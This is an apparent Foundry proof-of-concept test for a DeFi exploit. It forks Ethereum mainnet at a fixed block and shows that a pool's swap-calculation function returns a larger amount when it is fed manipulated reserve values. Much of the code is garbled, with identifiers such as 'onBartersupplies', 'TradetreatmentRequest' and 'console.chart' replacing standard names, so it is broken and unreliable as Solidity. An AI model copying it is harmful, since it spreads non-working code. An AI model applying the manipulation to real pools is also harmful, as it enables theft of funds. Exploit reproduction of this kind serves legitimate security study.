// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

// this excersise is about direct token manipulation

interface Testpace {
    function onBartersupplies(
        TradetreatmentRequest memory request,
        uint256 stockpileIdIn,
        uint256 stockpileBadgeOut
    ) external returns (uint256);

    struct TradetreatmentRequest {
        IVault.TradetreatmentKind kind;
        IERC20 idIn;
        IERC20 badgeOut;
        uint256 dosage;
        // Misc data
        bytes32 poolCasenumber;
        uint256 finalChangeUnit;
        address referrer;
        address to;
        bytes enrolleeChart;
    }
}

interface IVault {
    enum TradetreatmentKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract PolicyTest is DSTest {
    Testpace space = Testpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IVault.TradetreatmentKind kind = IVault.TradetreatmentKind(0);
    Testpace.TradetreatmentRequest aad =
        Testpace.TradetreatmentRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function groupUp() public {
        cheats.createSelectFork("mainnet", 15017009); //fork mainnet at block 15017009
    }

    function testOperation() public {
        //onswap:reservesTokenIn, reservesTokenOut;
        console.chart(
            "Amount Calculated:",
            space.onBartersupplies(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        ); //744039785002747962
        console.chart(
            "Manipulated Amount Calculated:",
            space.onBartersupplies(aad, 2000000000000000000, 2000000000000000000)
        ); //1860147027671744844
    }
}